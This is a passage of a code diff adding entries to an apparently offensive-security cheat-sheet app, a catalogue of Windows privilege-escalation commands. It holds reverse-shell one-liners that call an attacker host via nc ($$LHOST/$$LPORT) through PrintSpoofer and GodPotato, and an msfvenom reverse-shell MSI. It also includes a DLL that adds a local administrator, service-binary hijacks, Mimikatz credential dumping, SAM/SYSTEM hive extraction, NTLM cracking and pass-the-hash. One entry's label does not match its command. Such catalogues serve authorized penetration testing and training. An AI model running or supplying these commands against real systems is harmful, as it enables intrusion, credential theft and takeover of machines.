+              { id: 'wpcu2', label: 'Standard unattend search paths', os: 'Windows', command: 'Get-Content C:\\Windows\\sysprep\\sysprep.xml 2>$null\nGet-Content C:\\Windows\\sysprep\\sysprep.inf 2>$null\nGet-Content C:\\Windows\\Panther\\unattend.xml 2>$null\nGet-Content C:\\Windows\\Panther\\Unattended.xml 2>$null\nGet-Content C:\\Windows\\system32\\sysprep.inf 2>$null\nGet-Content C:\\Windows\\system32\\sysprep\\sysprep.xml 2>$null', notes: '' },
+              { id: 'wpcu3', label: 'Decode base64 password from unattend.xml', os: 'Windows', command: '[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("BASE64_HASH_HERE"))', notes: 'Passwords in unattend.xml may be stored as base64-encoded Unicode strings.' },
+            ],
+          },
+          {
+            id: 'wpe-clf',
+            name: 'Credentials from Log Files',
+            commands: [
+              { id: 'wpcl1', label: 'Search IIS logs for credentials', os: 'Windows', command: "Get-ChildItem -Path C:\\inetpub\\logs -Recurse -Filter '*.log' -ErrorAction SilentlyContinue | Select-String -Pattern 'password|pass=|pwd=|Authorization' | Select-Object -First 50", notes: 'Credentials submitted in GET parameters appear in plaintext in IIS logs.' },
+              { id: 'wpcl2', label: 'Search Apache/XAMPP logs', os: 'Windows', command: "Get-ChildItem -Path C:\\xampp\\apache\\logs,C:\\wamp\\logs -Recurse -Filter '*.log' -ErrorAction SilentlyContinue | Select-String -Pattern 'pass|pwd|token' | Select-Object -First 50", notes: '' },
+              { id: 'wpcl3', label: 'Windows event log — failed logins (attacker box)', os: 'Linux', command: "python3 /opt/impacket/examples/lookupsid.py '$$DOMAIN/$$USER:$$PASSWORD'@$$IP", notes: '' },
+              { id: 'wpcl4', label: 'Search temp and debug log files', os: 'Windows', command: "Get-ChildItem -Path $env:TEMP,C:\\Windows\\Temp,C:\\Temp -Recurse -Include *.log,*.txt -ErrorAction SilentlyContinue | Select-String -Pattern 'password|passwd|secret' | Select-Object -First 30", notes: 'Applications frequently write credentials to temp/debug logs during installation or crashes.' },
+            ],
+          },
+          {
+            id: 'wpe-cgrp',
+            name: 'User Groups',
+            commands: [
+              { id: 'wpcg1', label: 'Current user identity and groups', os: 'Windows', command: 'whoami /all', notes: 'Shows username, SID, groups, and privileges in one shot. Most important first check.' },
+              { id: 'wpcg2', label: 'List local groups', os: 'Windows', command: 'net localgroup', notes: '' },
+              { id: 'wpcg3', label: 'List local Administrators group', os: 'Windows', command: 'net localgroup Administrators', notes: '' },
+              { id: 'wpcg4', label: 'Dangerous group membership checks', os: 'Windows', command: '# Check for high-value groups:\nnet localgroup "Backup Operators"\nnet localgroup "Remote Desktop Users"\nnet localgroup "Event Log Readers"\nnet localgroup "DnsAdmins"', notes: 'Backup Operators can read any file (backup privilege). DnsAdmins can load a DLL into DNS service (SYSTEM). Event Log Readers can read security logs.' },
+            ],
+          },
+        ],
+      },
+
+      /* ── Exploit ────────────────────────────────────────────────────────── */
+      {
+        id: 'wpe-exploit',
+        name: 'Exploit',
+        description: 'Exploit vulnerable software — OS, local services, or installed applications — to gain SYSTEM.',
+        tags: ['windows', 'privesc', 'exploit'],
+        subtechniques: [
+          {
+            id: 'wpe-esvc',
+            name: 'Services Running on Localhost',
+            commands: [
+              { id: 'wpel1', label: 'List localhost-only TCP listeners', os: 'Windows', command: 'netstat -ano | findstr "127.0.0.1"', notes: 'Services bound to 127.0.0.1 are not exposed externally but reachable from the compromised host.' },
+              { id: 'wpel2', label: 'All listening sockets with PID', os: 'Windows', command: 'netstat -ano | findstr "LISTENING"', notes: '' },
+              { id: 'wpel3', label: 'Map PID to process name', os: 'Windows', command: 'Get-Process | Where-Object { $_.Id -eq $$PID } | Select-Object Name,Id,Path', notes: 'Replace $$PID with the PID from netstat to identify what is listening.' },
+              { id: 'wpel4', label: 'Probe localhost HTTP service', os: 'Windows', command: 'Invoke-WebRequest -Uri "http://127.0.0.1:$$PORT/" -UseBasicParsing | Select-Object StatusCode,Content', notes: 'Admin panels and REST APIs running on localhost are common privilege escalation vectors.' },
+            ],
+          },
+          {
+            id: 'wpe-eker',
+            name: 'Kernel Version',
+            commands: [
+              { id: 'wpek1', label: 'Get OS version and build', os: 'Windows', command: 'systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix"', notes: '' },
+              { id: 'wpek2', label: 'Windows Exploit Suggester — Next Generation (WES-NG)', os: 'Linux', command: '# On target:\nsysteminfo > C:\\Temp\\sysinfo.txt\n\n# Transfer to attacker machine, then:\npython3 wes.py --update\npython3 wes.py sysinfo.txt --impact "Elevation of Privilege"', notes: 'WES-NG cross-references installed patches against CVE database. https://github.com/bitsadmin/wesng' },
+              { id: 'wpek3', label: 'List missing hotfixes', os: 'Windows', command: 'Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 20\nwmic qfe list brief /format:table', notes: 'Check the last hotfix date — machines with old patch dates are likely vulnerable to known public exploits.' },
+              { id: 'wpek4', label: 'MS16-032 / MS15-051 quick check', os: 'Windows', command: '# MS16-032 (Token Kidnapping) — 2008R2/7 x64, 2012R1 x64:\n# Requires 2+ CPU cores\n[Environment]::ProcessorCount\nsysteminfo | findstr /C:"OS Version"\n# CVE-2021-36934 (HiveNightmare) — Win10 21H1 and earlier:\nicacls C:\\Windows\\System32\\config\\SAM', notes: '' },
+            ],
+          },
+          {
+            id: 'wpe-eswv',
+            name: 'Software Versions',
+            commands: [
+              { id: 'wpesw1', label: 'List installed software (registry)', os: 'Windows', command: 'Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* |\nSelect-Object DisplayName,DisplayVersion,Publisher,InstallDate |\nSort-Object DisplayName | Format-Table -AutoSize', notes: '' },
+              { id: 'wpesw2', label: 'List installed software (32-bit apps)', os: 'Windows', command: 'Get-ItemProperty "HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*" |\nSelect-Object DisplayName,DisplayVersion,Publisher | Sort-Object DisplayName', notes: '' },
+              { id: 'wpesw3', label: 'Check for common vulnerable software', os: 'Windows', command: "# Look for old versions of:\nGet-Command java 2>$null | Select-Object -ExpandProperty Version\nGet-Command python 2>$null | Select-Object -ExpandProperty Version\n(Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v4\\Full').Release", notes: '' },
+              { id: 'wpesw4', label: 'searchsploit Windows software (attacker box)', os: 'Linux', command: 'searchsploit "$$SOFTWARE_NAME $$VERSION local privilege"', notes: 'Run from your attacker machine. Replace $$SOFTWARE_NAME and $$VERSION with findings from target.' },
+            ],
+          },
+          {
+            id: 'wpe-esvc2',
+            name: 'Service Versions',
+            commands: [
+              { id: 'wpesv1', label: 'List all running services with binary paths', os: 'Windows', command: 'Get-WmiObject Win32_Service | Where-Object { $_.State -eq "Running" } | Select-Object Name,DisplayName,PathName,StartMode | Format-List', notes: '' },
+              { id: 'wpesv2', label: 'Get binary version for a specific service', os: 'Windows', command: '(Get-Item "C:\\path\\to\\service.exe").VersionInfo | Select-Object ProductName,FileVersion,ProductVersion', notes: '' },
+              { id: 'wpesv3', label: 'IIS version', os: 'Windows', command: '[System.Diagnostics.FileVersionInfo]::GetVersionInfo("$env:SystemRoot\\system32\\inetsrv\\iis.dll").FileVersion', notes: '' },
+              { id: 'wpesv4', label: 'Check PrintSpooler (Spooler service) running', os: 'Windows', command: 'Get-Service Spooler | Select-Object Status,StartType\n# If running + SeImpersonatePrivilege → PrintNightmare / PrintSpoofer attack vector', notes: 'SpoolSS service is required for PrintSpoofer / PrintNightmare (CVE-2021-1675) exploitation.' },
+            ],
+          },
+        ],
+      },
+
+      /* ── Misconfiguration ───────────────────────────────────────────────── */
+      {
+        id: 'wpe-misc',
+        name: 'Misconfiguration',
+        description: 'Abuse Windows misconfigurations — weak service permissions, token privileges, scheduled tasks, DLL hijacking, and registry settings.',
+        tags: ['windows', 'privesc', 'misconfiguration'],
+        subtechniques: [
+          {
+            id: 'wpe-mpriv',
+            name: 'User Privileges',
+            commands: [
+              { id: 'wpmp1', label: 'Check current privileges', os: 'Windows', command: 'whoami /priv', notes: 'Key dangerous privileges: SeImpersonatePrivilege, SeAssignPrimaryToken, SeDebugPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege.' },
+              { id: 'wpmp2', label: 'SeImpersonatePrivilege → PrintSpoofer', os: 'Windows', command: '.\\PrintSpoofer64.exe -i -c cmd.exe\n# Or with nc reverse shell:\n.\\PrintSpoofer64.exe -c "C:\\Temp\\nc.exe $$LHOST $$LPORT -e cmd.exe"', notes: 'SeImpersonate is held by most service accounts (IIS, MSSQL, etc.). PrintSpoofer works on Server 2019/Win10. https://github.com/itm4n/PrintSpoofer' },
+              { id: 'wpmp3', label: 'SeImpersonatePrivilege → GodPotato', os: 'Windows', command: '.\\GodPotato.exe -cmd "cmd /c whoami"\n.\\GodPotato.exe -cmd "cmd /c C:\\Temp\\nc.exe $$LHOST $$LPORT -e cmd.exe"', notes: 'GodPotato works on all Windows versions Server 2012–2022 with SeImpersonatePrivilege. https://github.com/BeichenDream/GodPotato' },
+              { id: 'wpmp4', label: 'SeDebugPrivilege → token duplication from LSASS', os: 'Windows', command: '# Migrate into or dump token from a SYSTEM process\n# With meterpreter:\ngetsystem\n# With Mimikatz (requires SeDebugPrivilege):\nprivilege::debug\nsekurlsa::logonpasswords', notes: 'SeDebugPrivilege lets you open any process — including LSASS — for reading or code injection.' },
+              { id: 'wpmp5', label: 'SeBackupPrivilege → read any file', os: 'Windows', command: '# Python-based (Backup Operators member)\n# Copy SAM and SYSTEM:\nreg save HKLM\\SAM C:\\Temp\\SAM\nreg save HKLM\\SYSTEM C:\\Temp\\SYSTEM\n# Then dump offline with secretsdump', notes: 'SeBackupPrivilege lets you read any file regardless of ACLs when opened with BACKUP_READ flag.' },
+            ],
+          },
+          {
+            id: 'wpe-msvc',
+            name: 'Services',
+            commands: [
+              { id: 'wpms1', label: 'Find services current user can configure (accesschk)', os: 'Windows', command: '.\\accesschk64.exe -uwcv "$$USER" * /accepteula 2>$null\n# Or check Everyone / Users:\n.\\accesschk64.exe -uwcv Everyone * /accepteula 2>$null', notes: 'accesschk from Sysinternals. Look for SERVICE_CHANGE_CONFIG or SERVICE_ALL_ACCESS. https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk' },
+              { id: 'wpms2', label: 'Check service permissions with sc sdshow', os: 'Windows', command: 'sc sdshow $$SERVICE_NAME', notes: 'Decode with SDDL reference. RP=start, WP=stop, CC=query config, DC=change config, LC=query status.' },
+              { id: 'wpms3', label: 'PowerUp — find all service misconfigs automatically', os: 'Windows', command: '. .\\PowerUp.ps1\nInvoke-AllChecks', notes: 'PowerUp checks unquoted paths, modifiable service binaries, weak service DACLs, AlwaysInstallElevated, etc. https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1' },
+              { id: 'wpms4', label: 'WinPEAS — full automated Windows privesc sweep', os: 'Windows', command: '.\\winPEASx64.exe 2>$null | Tee-Object -FilePath C:\\Temp\\winpeas.txt', notes: 'Most comprehensive automated check. Covers all service, registry, credential, and scheduled task vectors. https://github.com/peass-ng/PEASS-ng' },
+            ],
+          },
+          {
+            id: 'wpe-muq',
+            name: 'Unquoted Service Path',
+            commands: [
+              { id: 'wpmuq1', label: 'Find unquoted service paths', os: 'Windows', command: 'Get-WmiObject Win32_Service | Where-Object {\n  $_.PathName -notlike \'"\' + "*" + \'"\' -and\n  $_.PathName -match " " -and\n  $_.PathName -notmatch "^svchost"\n} | Select-Object Name,StartMode,State,PathName | Format-List', notes: '' },
+              { id: 'wpmuq2', label: 'Find unquoted paths via WMIC', os: 'Windows', command: 'wmic service get name,displayname,pathname,startmode | findstr /iv "C:\\Windows\\\\" | findstr /iv """', notes: 'Simpler one-liner. Excludes Windows-native services and properly quoted paths.' },
+              { id: 'wpmuq3', label: 'Check writable directory in the path', os: 'Windows', command: '# For path: C:\\Program Files\\Some App\\v1.2\\service.exe\n# Windows tries: C:\\Program.exe, C:\\Program Files\\Some.exe, C:\\Program Files\\Some App\\v1.2\\service.exe\n# Check if writable:\nicacls "C:\\Program Files\\Some App" | findstr /i "(W) (F) (M) Everyone Users"', notes: '' },
+              { id: 'wpmuq4', label: 'Place malicious binary and restart service', os: 'Windows', command: '# Copy payload to the hijack path:\ncopy C:\\Temp\\evil.exe "C:\\Program Files\\Some.exe"\n# Restart service (if permissions allow):\nsc stop VulnerableService\nsc start VulnerableService', notes: 'Name your payload binary to match the ambiguous path segment Windows will try first.' },
+            ],
+          },
+          {
+            id: 'wpe-mcb',
+            name: 'Change Service Binary Location',
+            commands: [
+              { id: 'wpmcb1', label: 'Check if service config is changeable', os: 'Windows', command: '.\\accesschk64.exe -uwcqv "$$USER" $$SERVICE_NAME /accepteula', notes: 'Need SERVICE_CHANGE_CONFIG or GENERIC_WRITE on the service object.' },
+              { id: 'wpmcb2', label: 'Change service binary path to payload', os: 'Windows', command: 'sc config $$SERVICE_NAME binpath= "C:\\Temp\\evil.exe"\nsc stop $$SERVICE_NAME\nsc start $$SERVICE_NAME', notes: 'The space after binpath= is required. The service starts your binary as SYSTEM if it was running as SYSTEM.' },
+              { id: 'wpmcb3', label: 'Add local admin via service binary change', os: 'Windows', command: 'sc config $$SERVICE_NAME binpath= "cmd /c net localgroup administrators $$USER /add"\nsc stop $$SERVICE_NAME; sc start $$SERVICE_NAME\n# Restore after:\nsc config $$SERVICE_NAME binpath= "C:\\original\\path\\service.exe"', notes: '' },
+            ],
+          },
+          {
+            id: 'wpe-mob',
+            name: 'Overwrite Service Binary',
+            commands: [
+              { id: 'wpmow1', label: 'Check service binary file permissions', os: 'Windows', command: 'icacls "C:\\path\\to\\service.exe"', notes: 'Look for (W), (F), or (M) for current user, Everyone, or Users group. Any write access is exploitable.' },
+              { id: 'wpmow2', label: 'Find all service binaries writable by current user', os: 'Windows', command: 'Get-WmiObject Win32_Service | ForEach-Object {\n  $path = ($_.PathName -replace \'"\',\'\').Trim() -split " " | Select-Object -First 1\n  if (Test-Path $path) {\n    $acl = Get-Acl $path -ErrorAction SilentlyContinue\n    $acl.Access | Where-Object { $_.FileSystemRights -match "Write|FullControl" -and $_.IdentityReference -match "$env:USERNAME|Everyone|Users" } |\n    ForEach-Object { [PSCustomObject]@{ Service=$_._.Name; Path=$path; Rights=$_.FileSystemRights; Identity=$_.IdentityReference } }\n  }\n}', notes: '' },
+              { id: 'wpmow3', label: 'Overwrite binary and restart service', os: 'Windows', command: '# Backup original:\ncopy "C:\\path\\to\\service.exe" "C:\\Temp\\service.exe.bak"\n# Overwrite:\ncopy /Y C:\\Temp\\evil.exe "C:\\path\\to\\service.exe"\nsc stop $$SERVICE_NAME\nsc start $$SERVICE_NAME', notes: 'Restore the original binary after escalation to avoid detection/service disruption.' },
+            ],
+          },
+          {
+            id: 'wpe-mdll',
+            name: 'DLL Hijacking',
+            commands: [
+              { id: 'wpmdll1', label: 'Find missing DLLs loaded by elevated processes (Procmon)', os: 'Windows', command: '# Run Procmon (Sysinternals) on target as low-priv user.\n# Filter: Process Name = TargetApp.exe, Path ends with .dll, Result = NAME NOT FOUND\n# Any missing DLL in a writable directory is a hijack opportunity.', notes: '' },
+              { id: 'wpmdll2', label: 'Check DLL search order directories for writability', os: 'Windows', command: 'icacls "C:\\Program Files\\VulnerableApp\\" | findstr /i "(W) (F) (M) Everyone Users Authenticated"', notes: 'Windows DLL search order: application dir → System32 → System → Windows → CWD → PATH dirs. App dir is most useful — writable app dir + missing DLL = hijack.' },
+              { id: 'wpmdll3', label: 'Minimal DLL template (compile on attacker box)', os: 'Linux', command: 'cat > evil_dll.c << \'EOF\'\n#include <windows.h>\nBOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {\n  if (fdwReason == DLL_PROCESS_ATTACH) {\n    system("cmd.exe /c net localgroup administrators $$USER /add");\n  }\n  return TRUE;\n}\nEOF\nx86_64-w64-mingw32-gcc -shared -o evil.dll evil_dll.c', notes: 'Cross-compile on Linux for Windows. Replace the system() call with your preferred payload.' },
+              { id: 'wpmdll4', label: 'Place DLL and trigger', os: 'Windows', command: '# Copy compiled DLL to the writable app directory:\ncopy C:\\Temp\\evil.dll "C:\\Program Files\\VulnerableApp\\missing.dll"\n# Trigger: restart the service or wait for the application to reload', notes: '' },
+            ],
+          },
+          {
+            id: 'wpe-maie',
+            name: 'AlwaysInstallElevated Set in Registry',
+            commands: [
+              { id: 'wpmie1', label: 'Check AlwaysInstallElevated keys', os: 'Windows', command: 'reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated', notes: 'Exploitable only if BOTH keys are set to 1 (0x1). If only one is set it does nothing.' },
+              { id: 'wpmie2', label: 'Generate malicious MSI (attacker box)', os: 'Linux', command: 'msfvenom -p windows/x64/shell_reverse_tcp LHOST=$$LHOST LPORT=$$LPORT -f msi -o evil.msi', notes: '' },
+              { id: 'wpmie3', label: 'Install MSI as elevated (no UAC prompt)', os: 'Windows', command: 'msiexec /quiet /qn /i C:\\Temp\\evil.msi', notes: '/quiet and /qn suppress all UI. The MSI runs as SYSTEM because AlwaysInstallElevated elevates all .msi installs.' },
+            ],
+          },
+          {
+            id: 'wpe-mst',
+            name: 'Scheduled Tasks',
+            commands: [
+              { id: 'wpmst1', label: 'List all scheduled tasks with run-as user', os: 'Windows', command: 'schtasks /query /fo LIST /v | findstr /i "Task Name\|Run As User\|Task To Run\|Status"', notes: 'Look for tasks running as SYSTEM or Administrator that execute a binary you can write.' },
+              { id: 'wpmst2', label: 'PowerShell — list tasks running as SYSTEM', os: 'Windows', command: 'Get-ScheduledTask | Where-Object { $_.Principal.UserId -eq "SYSTEM" -or $_.Principal.RunLevel -eq "Highest" } | Select-Object TaskName,TaskPath,@{n="Action";e={$_.Actions.Execute}} | Format-List', notes: '' },
+              { id: 'wpmst3', label: 'Check permissions on scheduled task binary', os: 'Windows', command: 'icacls "C:\\path\\to\\scheduled_task_binary.exe"', notes: 'If current user or Users group has write access to the binary → overwrite with payload.' },
+              { id: 'wpmst4', label: 'Create new elevated scheduled task (if allowed)', os: 'Windows', command: 'schtasks /create /tn "UpdateTask" /sc once /st 00:00 /ru SYSTEM /tr "C:\\Temp\\evil.exe"\nschtasks /run /tn "UpdateTask"', notes: 'Only works if current user has permission to create scheduled tasks. Uncommon but possible on some configurations.' },
+            ],
+          },
+          {
+            id: 'wpe-mew',
+            name: 'Executable File Writable',
+            commands: [
+              { id: 'wpmew1', label: 'Check writability of all service/task executables', os: 'Windows', command: 'Get-WmiObject Win32_Service | ForEach-Object {\n  $p = ($_.PathName -replace \'"\',\'\') -split " " | Select-Object -First 1\n  if ($p -and (Test-Path $p)) { icacls $p | Select-String "(W)|(F)|(M)" | ForEach-Object { "$p : $_" } }\n}', notes: '' },
+              { id: 'wpmew2', label: 'accesschk — find writable executables in Program Files', os: 'Windows', command: '.\\accesschk64.exe -uwf "$$USER" "C:\\Program Files\\" /accepteula\n.\\accesschk64.exe -uwf "Everyone" "C:\\Program Files\\" /accepteula', notes: '' },
+              { id: 'wpmew3', label: 'Overwrite binary and trigger execution', os: 'Windows', command: '# Backup first:\ncopy "C:\\path\\vuln.exe" "C:\\Temp\\vuln.exe.bak"\n# Overwrite:\ncopy /Y C:\\Temp\\evil.exe "C:\\path\\vuln.exe"\n# Trigger: restart service or wait for scheduled task', notes: '' },
+            ],
+          },
+          {
+            id: 'wpe-mdw',
+            name: 'Dependency Writable',
+            commands: [
+              { id: 'wpmdw1', label: 'Find loaded DLLs for a SYSTEM-level process', os: 'Windows', command: '$proc = Get-Process $$PROCESS_NAME\n$proc.Modules | Select-Object ModuleName,FileName | Format-List', notes: 'If any loaded DLL lives in a writable directory → overwrite with malicious DLL.' },
+              { id: 'wpmdw2', label: 'Check DLL file write permissions', os: 'Windows', command: 'icacls "C:\\path\\to\\loaded.dll"\n.\\accesschk64.exe -uwf "$$USER" "C:\\path\\to\\loaded.dll" /accepteula', notes: '' },
+              { id: 'wpmdw3', label: 'Monitor DLL loads with Procmon filter', os: 'Windows', command: '# Procmon filter settings:\n# Operation = Load Image\n# Path ends with .dll\n# Process = target SYSTEM process\n# Look for DLLs loaded from writable locations', notes: '' },
+            ],
+          },
+          {
+            id: 'wpe-msfr',
+            name: 'Sensitive Files Readable',
+            commands: [
+              { id: 'wpmsfr1', label: 'Check SAM/SYSTEM/SECURITY file permissions', os: 'Windows', command: 'icacls C:\\Windows\\System32\\config\\SAM\nicacls C:\\Windows\\System32\\config\\SYSTEM\nicacls C:\\Windows\\System32\\config\\SECURITY', notes: 'CVE-2021-36934 (HiveNightmare/SeriousSAM) — Win10 21H2 and earlier exposed SAM to all users.' },
+              { id: 'wpmsfr2', label: 'Find readable files owned by privileged users', os: 'Windows', command: 'Get-ChildItem -Path C:\\Users\\Administrator,C:\\Users\\admin -Recurse -ErrorAction SilentlyContinue | Where-Object { !$_.PSIsContainer } | ForEach-Object { $acl = Get-Acl $_.FullName; if ($acl.Access | Where-Object { $_.IdentityReference -match "Users|Everyone|$$USER" -and $_.FileSystemRights -match "Read|FullControl" }) { $_.FullName } }', notes: '' },
+              { id: 'wpmsfr3', label: 'Check for readable backup files in common paths', os: 'Windows', command: 'Get-ChildItem -Path C:\\ -Recurse -Include *.bak,*.backup,*.old,ntds.dit,SAM,SYSTEM -ErrorAction SilentlyContinue | Select-Object FullName,Length,LastWriteTime', notes: 'ntds.dit and SAM backups are high-value targets. If readable → offline hash extraction.' },
+            ],
+          },
+          {
+            id: 'wpe-msam',
+            name: 'SAM Hive',
+            commands: [
+              { id: 'wpmsam1', label: 'Check live SAM accessibility (HiveNightmare)', os: 'Windows', command: 'icacls C:\\Windows\\System32\\config\\SAM\n# Vulnerable if output contains: BUILTIN\\Users:(I)(RX)', notes: 'CVE-2021-36934 — Windows 10 versions prior to November 2021 patch exposed SAM to unprivileged users.' },
+              { id: 'wpmsam2', label: 'Dump SAM hive with reg save', os: 'Windows', command: 'reg save HKLM\\SAM C:\\Temp\\SAM.save\nreg save HKLM\\SYSTEM C:\\Temp\\SYSTEM.save\nreg save HKLM\\SECURITY C:\\Temp\\SECURITY.save', notes: 'Requires administrative rights or SeBackupPrivilege. Transfer files to attacker machine for offline cracking.' },
+              { id: 'wpmsam3', label: 'Extract hashes from SAM + SYSTEM (attacker box)', os: 'Linux', command: 'python3 /opt/impacket/examples/secretsdump.py -sam SAM.save -system SYSTEM.save LOCAL', notes: '' },
+              { id: 'wpmsam4', label: 'HiveNightmare — dump SAM as low-priv user (CVE-2021-36934)', os: 'Windows', command: '# Copy shadow copy of SAM:\nvssadmin list shadows\n# Use a shadow copy path:\ncopy "\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM" C:\\Temp\\SAM_shadow\ncopy "\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM" C:\\Temp\\SYSTEM_shadow', notes: '' },
+            ],
+          },
+          {
+            id: 'wpe-msys',
+            name: 'SYSTEM Hive',
+            commands: [
+              { id: 'wpmsys1', label: 'Save SYSTEM hive', os: 'Windows', command: 'reg save HKLM\\SYSTEM C:\\Temp\\SYSTEM.save', notes: 'The SYSTEM hive contains the boot key needed to decrypt password hashes stored in the SAM hive.' },
+              { id: 'wpmsys2', label: 'Extract local hashes from SAM + SYSTEM', os: 'Linux', command: 'python3 /opt/impacket/examples/secretsdump.py -sam C:\\Temp\\SAM.save -system C:\\Temp\\SYSTEM.save LOCAL', notes: '' },
+              { id: 'wpmsys3', label: 'Crack NTLM hashes (hashcat)', os: 'Linux', command: 'hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt\n# With rules:\nhashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule', notes: 'NTLM hashes (-m 1000) crack extremely fast. rockyou + best64 rules covers the majority of common passwords.' },
+              { id: 'wpmsys4', label: 'Pass-the-Hash with extracted NTLM', os: 'Linux', command: 'python3 /opt/impacket/examples/psexec.py -hashes ":$$NTLM_HASH" Administrator@$$IP\npython3 /opt/impacket/examples/wmiexec.py -hashes ":$$NTLM_HASH" Administrator@$$IP', notes: 'No need to crack — NTLM hashes can be used directly for authentication via PtH.' },
+            ],
+          },
+        ],
+      },
+    ],
+  },
+
+  /* ── 17. Footprinting ───────────────────────────────────────────────────── */
   {
     id: 'footprinting',
     name: 'Footprinting',
